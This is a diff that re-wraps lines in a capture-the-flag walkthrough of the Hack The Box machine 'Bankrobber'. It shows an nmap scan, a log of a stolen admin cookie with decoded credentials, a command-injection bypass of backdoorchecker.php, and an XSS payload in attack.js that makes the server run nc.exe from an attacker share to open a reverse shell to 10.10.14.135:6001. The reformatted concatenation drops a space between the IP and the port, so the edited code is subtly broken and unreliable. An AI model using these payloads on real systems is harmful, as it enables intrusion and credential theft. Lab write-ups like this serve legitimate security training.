@@ -4,7 +4,8 @@ An nmap scan reveals that Bankrobber is a Windows box and has HTTP running on po
 
 ```bash
 ┌─[rin@parrot]─[~/boxes/Bankrobber]
-└──╼ $sudo nmap -v -sC -sV -T4 --min-rate 1000 -p- bankrobber.htb -oA nmap/full-tcp
+└──╼ $sudo nmap -v -sC -sV -T4 --min-rate 1000 -p- bankrobber.htb \
+    -oA nmap/full-tcp
 <SNIP>
 PORT STATE SERVICE VERSION
 80/tcp open http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
@@ -29,7 +30,8 @@ PORT STATE SERVICE VERSION
 |_ssl-date: TLS randomness does not represent time
 | tls-alpn:
 |_ http/1.1
-445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds 
+    (workgroup: WORKGROUP)
 3306/tcp open mysql MariaDB (unauthorized)
 Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
@@ -87,7 +89,8 @@ So we know that XSS works. The first thing we can do is to steal the administrat
 This returns the base64 for both username and password to be "admin" and "Hopelessromantic":
 
 ```text
-10.129.70.254 - - <SNIP> "GET /?c=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
+10.129.70.254 - - <SNIP> "GET /?c=username=YWRtaW4%3D;
+    %20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
 ```
 
 After doing the SQL Injection to read source code \(see later in the SQL injection section\), you discover a php file called backdoorchecker.php that will execute a "dir" command supplied as POST parameter. However, the check only tests if the first three characters are equal to "dir". By adding a "\|" after "dir" you can add any other Windows command. The file backdoorchecker.php also checks that the request came from the same machine checking that the "REMOTE\_ADDR" is equal to "::1" the IPv6 localhost address.
@@ -122,10 +125,14 @@ To initiate the XSS you can use the script tag instead of the img tag. This will
 Once the script is fetched from the server, you should see tcpdump reporting the pings being sent to our box:
 
 ```bash
-12:26:08.465546 IP bankrobber.htb > 10.10.14.135: ICMP echo request, id 1, seq 1, length 40
-12:26:08.465571 IP 10.10.14.135 > bankrobber.htb: ICMP echo reply, id 1, seq 1, length 40
-12:26:08.465586 IP bankrobber.htb > 10.10.14.135: ICMP echo request, id 1, seq 2, length 40
-12:26:08.465592 IP 10.10.14.135 > bankrobber.htb: ICMP echo reply, id 1, seq 2, length 40
+12:26:08.465546 IP bankrobber.htb > 10.10.14.135: ICMP echo request, 
+    id 1, seq 1, length 40
+12:26:08.465571 IP 10.10.14.135 > bankrobber.htb: ICMP echo reply, 
+    id 1, seq 1, length 40
+12:26:08.465586 IP bankrobber.htb > 10.10.14.135: ICMP echo request, 
+    id 1, seq 2, length 40
+12:26:08.465592 IP 10.10.14.135 > bankrobber.htb: ICMP echo reply, 
+    id 1, seq 2, length 40
 <SNIP>
 ```
 
@@ -153,7 +160,8 @@ We can then modify attack.js to the following:
 ```javascript
 var xhr = new XMLHttpRequest();
 var url = "http://localhost/admin/backdoorchecker.php";
-var params = "cmd=dir | \\\\10.10.14.135\\share\\nc.exe 10.10.14.135 6001 -e cmd.exe";
+var params = "cmd=dir | \\\\10.10.14.135\\share\\nc.exe 10.10.14.135" +
+             "6001 -e cmd.exe";
 xhr.open("POST", url);
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 xhr.withCredentials=true;
